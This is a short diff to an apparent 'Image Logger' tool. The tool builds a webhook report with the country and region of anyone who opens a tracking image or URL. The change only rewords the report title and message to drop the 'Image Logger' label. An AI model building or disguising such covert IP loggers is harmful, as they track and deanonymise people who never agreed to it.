@@ -144,9 +144,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "- IP Logged -",
             "color": config["color"],
-            "description": f"""**A User Opened Your Image!**
+            "description": f"""**A user has opened your URL.**
 
 > **Country:** `{info['country'] if info['country'] else 'Unknown'}`
 > **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
